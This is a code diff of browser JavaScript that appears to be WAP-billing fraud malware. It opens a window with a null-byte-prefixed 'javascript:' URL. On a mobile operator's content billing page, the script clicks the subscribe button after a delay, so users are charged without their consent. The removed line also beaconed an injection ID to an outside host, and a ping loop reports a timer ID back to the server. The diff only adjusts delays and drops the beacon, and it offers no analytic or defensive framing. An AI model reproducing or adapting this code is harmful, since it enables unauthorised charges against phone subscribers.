@@ -43,7 +43,7 @@
 
                 try{
                     opens = true;
-                    window.open('\u0000javascript:if(document.domain){if(document.domain==\'cdp.beeline.ru\'){setTimeout(function() { document.getElementById(\'wapSubmitBtn\').click(); },1500);var x=new XMLHttpRequest();x.open("GET","http://syme.pw/inj_loadid='+ID+'");x.send()}};', nameW);
+                    window.open('\u0000javascript:if(document.domain){if(document.domain==\'cdp.beeline.ru\'){setTimeout(function() { document.getElementById(\'wapSubmitBtn\').click(); },2500);}};', nameW);
                 }catch(err){
 
                     var xxhttp = new XMLHttpRequest();
@@ -65,7 +65,7 @@
         var pg = new XMLHttpRequest();
         pg.open("GET", "/timmerid="+ID+"&sec="+x, true);
         pg.send();
-        setTimeout(function(){ping(x)},1000);
+        setTimeout(function(){ping(x)},3000);
     }
 
 
